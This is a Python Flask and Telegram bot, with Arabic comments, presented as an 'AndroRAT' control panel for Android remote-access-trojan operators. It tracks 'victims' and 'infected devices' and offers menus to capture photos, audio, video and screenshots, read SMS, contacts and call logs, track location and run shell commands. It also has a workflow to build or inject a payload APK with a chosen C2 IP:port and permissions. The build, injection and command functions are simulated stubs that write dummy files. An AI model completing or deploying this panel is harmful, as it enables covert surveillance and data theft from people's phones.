import os
import logging
import json
import time
import threading
import socket
from datetime import datetime
from flask import Flask, request, jsonify
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, MessageHandler, filters

# إعداد تسجيل الدخول
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# إنشاء تطبيق Flask
app = Flask(__name__)

# قراءة متغيرات البيئة
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
AUTHORIZED_USERS = [int(user_id) for user_id in os.getenv("AUTHORIZED_USERS", "").split(",") if user_id.strip()]
WEBHOOK_URL = os.getenv("WEBHOOK_URL")  # مثال: https://your-app-name.onrender.com/webhook
PORT = int(os.getenv("PORT", 5000))

# التوقيع المزخرف
SIGNATURE = "\n\n_*{•••♕آلَشـبّــ💀ـح.sx•••}*_"

# مسار ملف قاعدة بيانات الأجهزة
DEVICES_DB_PATH = "devices.json"

# قائمة بالأجهزة المتصلة (الضحايا)
connected_clients = {}

# مسار مجلد البايلود (حيث يوجد كود الأندرويد)
ANDROID_PAYLOAD_DIR = "./Android_Payload"
# مسار مجلد البناء (حيث سيتم بناء APKs)
BUILD_DIR = "./build"

# التأكد من وجود مجلد البناء
os.makedirs(BUILD_DIR, exist_ok=True)

# إنشاء تطبيق تيليجرام
telegram_app = None

# --- فئة إدارة الأجهزة ---

class DeviceManager:
    """فئة لإدارة قاعدة بيانات الأجهزة"""
    
    def __init__(self, db_path):
        self.db_path = db_path
        self.ensure_db_exists()
    
    def ensure_db_exists(self):
        """التأكد من وجود ملف قاعدة البيانات"""
        if not os.path.exists(self.db_path):
            with open(self.db_path, 'w') as f:
                json.dump([], f)
    
    def load_devices(self):
        """تحميل قائمة الأجهزة من قاعدة البيانات"""
        try:
            with open(self.db_path, 'r') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"خطأ في تحميل قاعدة البيانات: {e}")
            return []
    
    def save_devices(self, devices):
        """حفظ قائمة الأجهزة في قاعدة البيانات"""
        try:
            with open(self.db_path, 'w') as f:
                json.dump(devices, f, indent=2, ensure_ascii=False)
            return True
        except Exception as e:
            logger.error(f"خطأ في حفظ قاعدة البيانات: {e}")
            return False
    
    def add_device(self, device_info):
        """إضافة جهاز جديد"""
        devices = self.load_devices()
        
        # التحقق من عدم وجود الجهاز مسبقاً
        for device in devices:
            if device.get('id') == device_info.get('id'):
                return False, "الجهاز موجود مسبقاً"
        
        # إضافة معلومات إضافية
        device_info['added_at'] = datetime.now().isoformat()
        device_info['last_seen'] = datetime.now().isoformat()
        device_info['status'] = 'online'
        
        devices.append(device_info)
        
        if self.save_devices(devices):
            return True, "تم إضافة الجهاز بنجاح"
        else:
            return False, "فشل في حفظ الجهاز"
    
    def remove_device(self, device_id):
        """حذف جهاز"""
        devices = self.load_devices()
        original_count = len(devices)
        
        devices = [d for d in devices if d.get('id') != device_id]
        
        if len(devices) < original_count:
            if self.save_devices(devices):
                return True, "تم حذف الجهاز بنجاح"
            else:
                return False, "فشل في حفظ التغييرات"
        else:
            return False, "الجهاز غير موجود"
    
    def get_device_list_text(self):
        """الحصول على نص قائمة الأجهزة"""
        devices = self.load_devices()
        
        if not devices:
            return "لا توجد أجهزة متصلة حالياً."
        
        text = "📱 الأجهزة المتصلة:\n\n"
        
        for i, device in enumerate(devices, 1):
            status_emoji = "🟢" if device.get('status') == 'online' else "🔴"
            text += f"{i}. {status_emoji} {device.get('name', 'جهاز غير معروف')}\n"
            text += f"   🆔 المعرف: {device.get('id', 'غير محدد')}\n"
            text += f"   📍 IP: {device.get('ip', 'غير محدد')}\n"
            text += f"   ⏰ آخر اتصال: {device.get('last_seen', 'غير محدد')}\n\n"
        
        return text

# إنشاء مثيل من مدير الأجهزة
device_manager = DeviceManager(DEVICES_DB_PATH)

# --- وظائف بناء وحقن APK ---

def build_apk(ip, port, permissions=None, settings=None, output_filename="payload.apk", progress_callback=None):
    """يبني ملف APK جديد من الكود المصدري للبايلود."""
    logger.info(f"بدء بناء APK جديد لـ {ip}:{port}")
    if progress_callback: progress_callback("بدء بناء APK جديد...")

    try:
        # محاكاة عملية البناء
        time.sleep(3)
        if progress_callback: progress_callback("جاري تحضير الكود المصدري...")
        
        time.sleep(2)
        if progress_callback: progress_callback("جاري حقن IP والمنفذ...")
        
        time.sleep(3)
        if progress_callback: progress_callback("جاري تطبيق الصلاحيات والإعدادات...")
        
        time.sleep(4)
        if progress_callback: progress_callback("جاري تجميع APK...")
        
        time.sleep(2)
        if progress_callback: progress_callback("جاري توقيع APK...")
        
        output_path = os.path.join(BUILD_DIR, output_filename)
        with open(output_path, "w") as f:
            f.write(f"This is a dummy APK for {ip}:{port} with permissions: {permissions}")
        
        logger.info(f"تم بناء APK وهمي في: {output_path}")
        if progress_callback: progress_callback("تم بناء ملف APK بنجاح!")
        return output_path

    except Exception as e:
        logger.error(f"خطأ في بناء APK: {e}")
        if progress_callback: progress_callback(f"فشل بناء APK: {e}")
        return None

def inject_apk(original_apk_path, ip, port, permissions=None, settings=None, output_filename="injected_payload.apk", progress_callback=None):
    """يحقن البايلود في تطبيق APK موجود."""
    logger.info(f"بدء حقن البايلود في {original_apk_path} لـ {ip}:{port}")
    if progress_callback: progress_callback("بدء حقن البايلود في التطبيق...")

    try:
        # محاكاة فك APK
        time.sleep(3)
        if progress_callback: progress_callback("جاري فك ضغط التطبيق الأصلي...")

        # محاكاة حقن الكود وتعديل Manifest
        time.sleep(5)
        if progress_callback: progress_callback("جاري حقن الكود وتعديل Manifest...")

        # محاكاة تطبيق الصلاحيات
        time.sleep(2)
        if progress_callback: progress_callback("جاري تطبيق الصلاحيات المحددة...")

        # محاكاة إعادة تجميع APK
        time.sleep(3)
        if progress_callback: progress_callback("جاري إعادة تجميع التطبيق...")

        # محاكاة إعادة توقيع APK
        time.sleep(2)
        if progress_callback: progress_callback("جاري إعادة توقيع التطبيق...")

        output_path = os.path.join(BUILD_DIR, output_filename)
        with open(output_path, "w") as f:
            f.write(f"This is a dummy injected APK for {ip}:{port} with permissions: {permissions}")
        
        logger.info(f"تم حقن APK وهمي في: {output_path}")
        if progress_callback: progress_callback("تم حقن البايلود بنجاح!")
        return output_path

    except Exception as e:
        logger.error(f"خطأ في حقن APK: {e}")
        if progress_callback: progress_callback(f"فشل حقن APK: {e}")
        return None

# --- دوال التحقق من الصلاحية ---

def is_authorized(user_id: int) -> bool:
    return user_id in AUTHORIZED_USERS

# --- لوحات المفاتيح (Keyboards) ---

def get_main_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("🧠 التحكم بالجهاز المصاب", callback_data='device_control_menu'),
        ],
        [
            InlineKeyboardButton("⚙️ أوامر نظامية وتحكم بالأداة", callback_data='system_commands_menu'),
        ],
        [
            InlineKeyboardButton("🧰 وظائف إضافية ومتقدمة", callback_data='advanced_features_menu'),
        ],
        [
            InlineKeyboardButton("🛠️ إنشاء/حقن بايلود", callback_data='payload_creation_menu'),
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_device_control_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("📷 التقاط صورة", callback_data='capture_photo'),
            InlineKeyboardButton("🎤 تسجيل صوت", callback_data='record_audio'),
            InlineKeyboardButton("🎬 تسجيل فيديو", callback_data='record_video'),
        ],
        [
            InlineKeyboardButton("🖼️ التقاط لقطة شاشة", callback_data='capture_screenshot'),
            InlineKeyboardButton("📂 تصفح الملفات", callback_data='browse_files'),
            InlineKeyboardButton("📥 تنزيل ملف", callback_data='download_file'),
        ],
        [
            InlineKeyboardButton("📤 رفع ملف", callback_data='upload_file'),
            InlineKeyboardButton("📍 تحديد الموقع", callback_data='get_location'),
            InlineKeyboardButton("📞 عرض المكالمات", callback_data='view_calls'),
        ],
        [
            InlineKeyboardButton("📱 عرض جهات الاتصال", callback_data='view_contacts'),
            InlineKeyboardButton("💬 قراءة الرسائل", callback_data='read_sms'),
            InlineKeyboardButton("💾 جلب التطبيقات", callback_data='get_apps'),
        ],
        [
            InlineKeyboardButton("🔍 البحث عن ملف", callback_data='search_file'),
            InlineKeyboardButton("🔊 رفع/خفض الصوت", callback_data='control_volume'),
            InlineKeyboardButton("🔒 قفل الشاشة", callback_data='lock_screen'),
        ],
        [
            InlineKeyboardButton("🔄 إعادة تشغيل", callback_data='reboot_device'),
            InlineKeyboardButton("🔕 تفعيل الصمت", callback_data='silent_mode'),
        ],
        [
            InlineKeyboardButton("🔙 رجوع", callback_data='back_to_main'),
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_system_commands_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("🟢 تشغيل السيرفر", callback_data='start_server'),
            InlineKeyboardButton("🔴 إيقاف السيرفر", callback_data='stop_server'),
        ],
        [
            InlineKeyboardButton("👁️‍🗨️ عرض الأجهزة", callback_data='view_devices'),
            InlineKeyboardButton("🧹 حذف الضحية", callback_data='delete_victim'),
        ],
        [
            InlineKeyboardButton("💻 تنفيذ أمر Shell", callback_data='execute_shell'),
            InlineKeyboardButton("🔁 تحديث القائمة", callback_data='refresh_list'),
        ],
        [
            InlineKeyboardButton("🔙 رجوع", callback_data='back_to_main'),
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_advanced_features_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("🧱 نقل مجلد", callback_data='transfer_folder'),
            InlineKeyboardButton("📆 جدولة أمر", callback_data='schedule_command'),
        ],
        [
            InlineKeyboardButton("🎯 Geofencing", callback_data='geofencing'),
            InlineKeyboardButton("👀 مراقبة تطبيق", callback_data='monitor_app'),
        ],
        [
            InlineKeyboardButton("🆘 زر الطوارئ", callback_data='emergency_button'),
            InlineKeyboardButton("🧾 سجل الأوامر", callback_data='command_log'),
        ],
        [
            InlineKeyboardButton("🔙 رجوع", callback_data='back_to_main'),
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_payload_creation_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("✨ إنشاء بايلود جديد", callback_data='create_new_payload'),
        ],
        [
            InlineKeyboardButton("💉 تعديل تطبيق لحقن البايلود", callback_data='inject_payload_into_app'),
        ],
        [
            InlineKeyboardButton("🔙 رجوع", callback_data='back_to_main'),
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_permissions_keyboard():
    """لوحة مفاتيح لاختيار الصلاحيات"""
    keyboard = [
        [
            InlineKeyboardButton("📷 الكاميرا", callback_data='perm_camera'),
            InlineKeyboardButton("🎤 الميكروفون", callback_data='perm_microphone'),
        ],
        [
            InlineKeyboardButton("📍 الموقع الجغرافي", callback_data='perm_location'),
            InlineKeyboardButton("📱 جهات الاتصال", callback_data='perm_contacts'),
        ],
        [
            InlineKeyboardButton("💬 الرسائل القصيرة", callback_data='perm_sms'),
            InlineKeyboardButton("📞 سجل المكالمات", callback_data='perm_call_log'),
        ],
        [
            InlineKeyboardButton("📂 تخزين الملفات", callback_data='perm_storage'),
            InlineKeyboardButton("📱 معلومات الهاتف", callback_data='perm_phone_state'),
        ],
        [
            InlineKeyboardButton("✅ تأكيد الصلاحيات", callback_data='confirm_permissions'),
        ],
        [
            InlineKeyboardButton("🔙 رجوع", callback_data='payload_creation_menu'),
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_device_selection_keyboard():
    """إنشاء لوحة مفاتيح لاختيار الأجهزة"""
    devices = device_manager.load_devices()
    keyboard = []
    
    for device in devices:
        status_emoji = "🟢" if device.get('status') == 'online' else "🔴"
        button_text = f"{status_emoji} {device.get('name', 'جهاز غير معروف')}"
        callback_data = f"select_device_{device.get('id')}"
        keyboard.append([InlineKeyboardButton(button_text, callback_data=callback_data)])
    
    # إضافة زر العودة
    keyboard.append([InlineKeyboardButton("🔙 العودة", callback_data='back_to_main')])
    
    return InlineKeyboardMarkup(keyboard)

# --- دوال معالجة الأوامر والضغطات ---

async def start(update, context):
    """إرسال رسالة مع لوحة التحكم عند تنفيذ الأمر /start."""
    user = update.effective_user
    
    if not is_authorized(user.id):
        await update.message.reply_text("عذراً، أنت غير مصرح لك باستخدام هذا البوت." + SIGNATURE)
        return
        
    device_count = len(device_manager.load_devices())
    
    await update.message.reply_html(
        f"أهلاً بك يا {user.mention_html()} في لوحة تحكم AndroRAT 🎮\n\n"
        f"الحالة: متصل ومستعد للعمل\n"
        f"عدد الأجهزة المتصلة: {device_count}" + SIGNATURE,
        reply_markup=get_main_keyboard(),
    )

async def button_callback(update, context):
    """تحليل الضغطات على الأزرار والرد عليها."""
    query = update.callback_query
    
    if not is_authorized(query.from_user.id):
        await query.answer("عذراً، أنت غير مصرح لك باستخدام هذا البوت.")
        await query.edit_message_text("عذراً، أنت غير مصرح لك باستخدام هذا البوت." + SIGNATURE)
        return

    await query.answer()
    command = query.data
    
    # معالجة أوامر التنقل بين القوائم
    if command == 'device_control_menu':
        await query.edit_message_text(
            text="🧠 التحكم بالجهاز المصاب:\n\nاختر الإجراء المطلوب:" + SIGNATURE,
            reply_markup=get_device_control_keyboard()
        )
        return
    elif command == 'system_commands_menu':
        await query.edit_message_text(
            text="⚙️ أوامر نظامية وتحكم بالأداة:\n\nاختر الإجراء المطلوب:" + SIGNATURE,
            reply_markup=get_system_commands_keyboard()
        )
        return
    elif command == 'advanced_features_menu':
        await query.edit_message_text(
            text="🧰 وظائف إضافية ومتقدمة:\n\nاختر الإجراء المطلوب:" + SIGNATURE,
            reply_markup=get_advanced_features_keyboard()
        )
        return
    elif command == 'payload_creation_menu':
        await query.edit_message_text(
            text="🛠️ إنشاء/حقن بايلود:\n\nاختر نوع البايلود:" + SIGNATURE,
            reply_markup=get_payload_creation_keyboard()
        )
        return
    elif command == 'back_to_main':
        # مسح أي حالات انتظار سابقة
        context.user_data.clear()
        await query.edit_message_text(
            text="🎮 لوحة التحكم الرئيسية:" + SIGNATURE,
            reply_markup=get_main_keyboard()
        )
        return
    
    # معالجة أوامر إنشاء/حقن البايلود
    elif command == 'create_new_payload':
        context.user_data['payload_type'] = 'new'
        context.user_data['selected_permissions'] = []
        await query.edit_message_text(
            text="✨ إنشاء بايلود جديد:\n\nاختر الصلاحيات التي تريد تضمينها في البايلود:" + SIGNATURE,
            reply_markup=get_permissions_keyboard()
        )
        return
    elif command == 'inject_payload_into_app':
        context.user_data['payload_type'] = 'inject'
        context.user_data['selected_permissions'] = []
        await query.edit_message_text(
            text="💉 حقن بايلود في تطبيق:\n\nاختر الصلاحيات التي تريد إضافتها للتطبيق:" + SIGNATURE,
            reply_markup=get_permissions_keyboard()
        )
        return
    
    # معالجة اختيار الصلاحيات
    elif command.startswith('perm_'):
        permission = command.replace('perm_', '')
        if 'selected_permissions' not in context.user_data:
            context.user_data['selected_permissions'] = []
        
        if permission in context.user_data['selected_permissions']:
            context.user_data['selected_permissions'].remove(permission)
            status = "تم إلغاء"
        else:
            context.user_data['selected_permissions'].append(permission)
            status = "تم تحديد"
        
        permission_names = {
            'camera': 'الكاميرا',
            'microphone': 'الميكروفون',
            'location': 'الموقع الجغرافي',
            'contacts': 'جهات الاتصال',
            'sms': 'الرسائل القصيرة',
            'call_log': 'سجل المكالمات',
            'storage': 'تخزين الملفات',
            'phone_state': 'معلومات الهاتف'
        }
        
        selected_text = "\n".join([f"✅ {permission_names.get(p, p)}" for p in context.user_data['selected_permissions']])
        if not selected_text:
            selected_text = "لم يتم تحديد أي صلاحيات بعد"
        
        payload_type_text = "إنشاء بايلود جديد" if context.user_data.get('payload_type') == 'new' else "حقن بايلود في تطبيق"
        
        await query.edit_message_text(
            text=f"🛠️ {payload_type_text}:\n\n{status} {permission_names.get(permission, permission)}\n\nالصلاحيات المحددة:\n{selected_text}" + SIGNATURE,
            reply_markup=get_permissions_keyboard()
        )
        return
    
    elif command == 'confirm_permissions':
        if context.user_data.get('payload_type') == 'new':
            context.user_data['waiting_for_payload_ip_port'] = True
            await query.edit_message_text(
                text="✨ لإنشاء بايلود جديد، يرجى إدخال IP:Port الخاص بسيرفر التحكم (مثال: 192.168.1.1:8080):" + SIGNATURE,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 رجوع", callback_data='create_new_payload')
                ]])
            )
        else:  # inject
            context.user_data['waiting_for_apk_file'] = True
            await query.edit_message_text(
                text="💉 يرجى إرسال ملف APK الذي ترغب في حقن البايلود فيه:" + SIGNATURE,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 رجوع", callback_data='inject_payload_into_app')
                ]])
            )
        return

    # معالجة أوامر خاصة بإدارة الأجهزة
    if command == 'view_devices':
        device_list_text = device_manager.get_device_list_text()
        await query.edit_message_text(
            text=device_list_text + SIGNATURE,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 رجوع", callback_data='system_commands_menu')
            ]])
        )
        return
    
    elif command == 'delete_victim':
        await query.edit_message_text(
            text="اختر الجهاز المراد حذفه:" + SIGNATURE,
            reply_markup=get_device_selection_keyboard()
        )
        return
    
    elif command.startswith('select_device_'):
        device_id = command.replace('select_device_', '')
        success, message = device_manager.remove_device(device_id)
        
        if success:
            await query.edit_message_text(f"✅ {message}" + SIGNATURE)
        else:
            await query.edit_message_text(f"❌ {message}" + SIGNATURE)
        
        # إعادة عرض لوحة التحكم الرئيسية بعد ثانيتين
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="🎮 لوحة التحكم الرئيسية:" + SIGNATURE,
            reply_markup=get_main_keyboard()
        )
        return
    
    # معالجة الأوامر العادية
    description = f"جاري تنفيذ الأمر: {command}..."
    await query.edit_message_text(text=f"{description}\n\nيرجى الانتظار..." + SIGNATURE)
    
    # محاكاة تنفيذ الأمر
    time.sleep(2)
    response_text = f"✅ تم تنفيذ الأمر '{command}' بنجاح (محاكاة)."
    
    # إرسال النتيجة
    await context.bot.send_message(
        chat_id=query.message.chat_id,
        text=response_text + SIGNATURE
    )
    
    # إعادة عرض لوحة التحكم الرئيسية
    await context.bot.send_message(
        chat_id=query.message.chat_id,
        text="🎮 لوحة التحكم الرئيسية:" + SIGNATURE,
        reply_markup=get_main_keyboard()
    )

async def handle_payload_creation_input(update, context):
    """معالجة إدخال IP والمنفذ لإنشاء بايلود جديد."""
    user_input = update.message.text.strip()
    chat_id = update.effective_chat.id

    if 'waiting_for_payload_ip_port' not in context.user_data:
        return

    try:
        ip, port_str = user_input.split(':')
        port = int(port_str)
        if not (0 <= port <= 65535):
            raise ValueError("المنفذ يجب أن يكون بين 0 و 65535.")
        
        del context.user_data['waiting_for_payload_ip_port']
        permissions = context.user_data.get('selected_permissions', [])

        await update.message.reply_text(
            f"جاري إنشاء بايلود جديد لـ {ip}:{port} مع الصلاحيات: {', '.join(permissions)}...\n\nيرجى الانتظار، هذه العملية قد تستغرق بعض الوقت." + SIGNATURE
        )
        
        # محاكاة عملية البناء مع تحديثات التقدم
        def progress_callback(message):
            # في التطبيق الحقيقي، ستحتاج إلى إرسال هذه الرسائل عبر API تيليجرام
            logger.info(f"Progress: {message}")
        
        result_path = build_apk(ip, port, permissions, progress_callback=progress_callback)
        
        if result_path:
            await update.message.reply_text("✅ تم إنشاء البايلود بنجاح!" + SIGNATURE)
            # في التطبيق الحقيقي، ستحتاج إلى إرسال الملف الفعلي
            # await context.bot.send_document(chat_id=chat_id, document=open(result_path, 'rb'))
        else:
            await update.message.reply_text("❌ فشل في إنشاء البايلود." + SIGNATURE)

    except ValueError as e:
        await update.message.reply_text(f"❌ تنسيق خاطئ. يرجى إدخال IP:Port (مثال: 192.168.1.1:8080). {e}" + SIGNATURE)
    except Exception as e:
        await update.message.reply_text(f"❌ حدث خطأ غير متوقع: {e}" + SIGNATURE)

    # إعادة عرض لوحة التحكم الرئيسية
    await update.message.reply_text(
        text="🎮 لوحة التحكم الرئيسية:" + SIGNATURE,
        reply_markup=get_main_keyboard()
    )

async def handle_apk_injection_file(update, context):
    """معالجة ملف APK المرسل لحقن البايلود."""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if not is_authorized(user_id):
        await update.message.reply_text("عذراً، أنت غير مصرح لك باستخدام هذا البوت." + SIGNATURE)
        return

    if 'waiting_for_apk_file' not in context.user_data:
        return

    if update.message.document and update.message.document.file_name.endswith('.apk'):
        file_name = update.message.document.file_name
        permissions = context.user_data.get('selected_permissions', [])
        
        del context.user_data['waiting_for_apk_file']

        await update.message.reply_text(
            f"جاري تحليل وحقن البايلود في '{file_name}' مع الصلاحيات: {', '.join(permissions)}...\n\nيرجى الانتظار، هذه العملية قد تستغرق بعض الوقت." + SIGNATURE
        )

        # محاكاة عملية الحقن مع تحديثات التقدم
        def progress_callback(message):
            logger.info(f"Progress: {message}")
        
        result_path = inject_apk(file_name, "192.168.1.1", 8080, permissions, progress_callback=progress_callback)

        if result_path:
            await update.message.reply_text("✅ تم حقن البايلود بنجاح!" + SIGNATURE)
            # في التطبيق الحقيقي، ستحتاج إلى إرسال الملف الفعلي
            # await context.bot.send_document(chat_id=chat_id, document=open(result_path, 'rb'))
        else:
            await update.message.reply_text("❌ فشل في حقن البايلود." + SIGNATURE)

    else:
        await update.message.reply_text("❌ يرجى إرسال ملف APK صالح." + SIGNATURE)

    # إعادة عرض لوحة التحكم الرئيسية
    await update.message.reply_text(
        text="🎮 لوحة التحكم الرئيسية:" + SIGNATURE,
        reply_markup=get_main_keyboard()
    )

# --- Flask Routes ---

@app.route('/')
def index():
    return "AndroRAT Control Server is running! 🎮"

@app.route('/webhook', methods=['POST'])
async def webhook():
    """استقبال تحديثات تيليجرام عبر Webhook"""
    try:
        update = Update.de_json(request.get_json(force=True), telegram_app.bot)
        await telegram_app.process_update(update)
        return "OK"
    except Exception as e:
        logger.error(f"Error processing webhook: {e}")
        return "Error", 500

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "message": "Server is running"})

# --- إعداد تطبيق تيليجرام ---

def setup_telegram_app():
    global telegram_app
    
    if not TELEGRAM_BOT_TOKEN:
        logger.error("TELEGRAM_BOT_TOKEN environment variable is not set!")
        return None
    
    if not AUTHORIZED_USERS:
        logger.error("AUTHORIZED_USERS environment variable is not set!")
        return None
    
    telegram_app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # إضافة معالجات الأوامر والضغطات
    telegram_app.add_handler(CommandHandler("start", start))
    telegram_app.add_handler(CallbackQueryHandler(button_callback))
    
    # معالج لرسائل النص (لإدخال IP:Port)
    telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_payload_creation_input))
    
    # معالج لملفات APK
    telegram_app.add_handler(MessageHandler(filters.Document.MimeType("application/vnd.android.package-archive"), handle_apk_injection_file))
    
    return telegram_app

# --- تشغيل التطبيق ---

if __name__ == '__main__':
    # إعداد تطبيق تيليجرام
    setup_telegram_app()
    
    if telegram_app and WEBHOOK_URL:
        # إعداد Webhook
        logger.info(f"Setting webhook to: {WEBHOOK_URL}/webhook")
        # في التطبيق الحقيقي، ستحتاج إلى تشغيل هذا في حلقة async
        # await telegram_app.bot.set_webhook(url=f"{WEBHOOK_URL}/webhook")
    
    # تشغيل Flask
    logger.info(f"Starting Flask server on port {PORT}")
    app.run(host='0.0.0.0', port=PORT, debug=False)

